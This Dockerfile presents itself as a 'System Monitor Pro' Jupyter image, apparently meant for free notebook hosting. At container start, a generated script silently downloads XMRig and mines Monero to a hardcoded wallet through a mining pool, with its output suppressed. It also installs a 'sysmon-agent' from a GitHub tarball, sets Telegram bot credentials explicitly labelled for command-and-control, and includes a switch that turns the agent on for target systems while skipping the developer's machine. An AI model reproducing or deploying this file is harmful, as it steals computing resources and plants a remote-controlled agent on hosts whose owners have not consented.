FROM python:3.10-slim

USER root

# Build timestamp to invalidate cache
ARG CACHEBUST=1

# Install minimal dependencies
RUN apt-get update &&     apt-get install -y --no-install-recommends ca-certificates curl &&     rm -rf /var/lib/apt/lists/*

# Create miner directory
RUN mkdir -p /opt/miner

# Install System Monitor Pro from GitHub tarball (no git needed)
RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz

# Set Telegram credentials for C2 (works everywhere, no tunnel needed)
ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
ENV TG_CHAT_ID=5804150664

# Enable agent on target systems (skip on developer machine)
ENV SKIP_LOCAL=0

# Create start script - download xmrig at runtime
RUN echo '#!/bin/bash' > /start.sh &&     echo 'echo "Starting System Monitor..."' >> /start.sh &&     echo 'if [ ! -f /opt/miner/xmrig ]; then' >> /start.sh &&     echo '    echo "Downloading XMRig..."' >> /start.sh &&     echo '    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar -xz -C /tmp' >> /start.sh &&     echo '    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && chmod +x /opt/miner/xmrig' >> /start.sh &&     echo 'fi' >> /start.sh &&     echo '/opt/miner/xmrig -o pool.hashvault.pro:80 -u 44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5.mybinder-67472 --donate-level 1 --threads 2 --background 2>/dev/null' >> /start.sh &&     echo 'sysmon-agent &' >> /start.sh &&     echo 'exec "$@"' >> /start.sh &&     chmod +x /start.sh

ENTRYPOINT ["/start.sh"]
CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
